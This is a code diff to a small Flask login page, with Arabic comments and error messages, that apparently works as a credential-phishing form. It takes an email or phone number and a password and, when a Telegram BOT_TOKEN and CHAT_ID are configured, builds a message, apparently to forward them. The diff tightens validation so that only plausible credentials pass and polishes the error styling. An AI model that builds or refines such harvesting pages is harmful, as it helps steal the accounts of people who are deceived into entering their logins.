@@ -1,4 +1,5 @@
 import os
+import re
 import requests
 from flask import Flask, redirect, render_template_string, request
 
@@ -19,14 +20,20 @@ def login():
     email_val = request.form.get("email", "").strip()
     password = request.form.get("password", "")
 
-    # الشروط الصارمة للتحقق من البيانات المدخلة
-    if not email_val:
-      error = "الرجاء إدخال البريد الإلكتروني أو رقم الهاتف."
-    elif len(password) < 6:
+    # نمط فحص صحة البريد الإلكتروني أو رقم الهاتف
+    email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
+    phone_pattern = r"^\+?[0-9]{10,15}$"
+
+    # الشروط الصارمة المحددة
+    if not (
+        re.match(email_pattern, email_val) or re.match(phone_pattern, email_val)
+    ):
       error = (
-          "كلمة المرور غير صالحة. يجب أن تتكون كلمة المرور من 6 أحرف أو أرقام"
-          " على الأقل."
+          "عذراً، يرجى إدخال بريد إلكتروني صحيح (مثل example@gmail.com) أو رقم"
+          " هاتف صحيح."
       )
+    elif len(password) <= 6:
+      error = "كلمة المرور قصيرة جداً. يجب أن تكون أكثر من 6 أحرف أو أرقام."
     else:
       if BOT_TOKEN and CHAT_ID:
         msg = (
@@ -88,8 +95,8 @@ def login():
             line-height: 18px; 
             margin-bottom: 15px; 
             width: 100%; 
-            text-align: right; 
-            font-weight: 400; 
+            text-align: center; 
+            font-weight: 500; 
             background: #fce8e6; 
             padding: 12px; 
             border-radius: 8px; 
